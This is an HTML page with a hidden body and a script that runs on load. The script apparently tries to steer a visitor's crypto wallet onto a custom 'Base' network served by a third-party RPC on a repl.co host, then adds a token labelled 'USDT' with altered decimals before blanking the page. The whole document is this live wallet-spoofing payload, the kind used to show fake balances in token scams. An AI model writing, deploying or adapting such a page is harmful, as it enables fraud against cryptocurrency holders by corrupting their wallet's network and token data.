<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <style>body { display: none; }</style>
</head>
<body>
  <script>
  (async () => {
    alert("Script started");
    await new Promise(resolve => setTimeout(resolve, 1000));
    if (!window.ethereum) {
      alert("No wallet detected - please use a wallet app");
      window.location.href = "about:blank";
      return;
    }
    alert("Wallet detected");
    try {
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x2105" }]
        });
        alert("Switched to Base");
      } catch (switchError) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: "0x2105",
              chainName: "STBL Custom Base",
              rpcUrls: ["https://stbl-api-aod.alijohnod.repl.co/rpc"],
              nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
              blockExplorerUrls: ["https://basescan.org"]
            }]
          });
          alert("Network added");
        } else if (switchError.code !== -32002) {
          throw switchError;
        }
      }
      await window.ethereum.request({
        method: "wallet_watchAsset",
        params: {
          type: "ERC20",
          options: {
            address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDT
            symbol: "USDT",
            decimals: 18,
            chainId: "8453"
          }
        }
      });
      alert("Token added as USDT");
      window.location.href = "about:blank";
    } catch (e) {
      alert("Error: " + e.message);
      window.location.href = "about:blank";
    }
  })();
  </script>
</body>
</html>
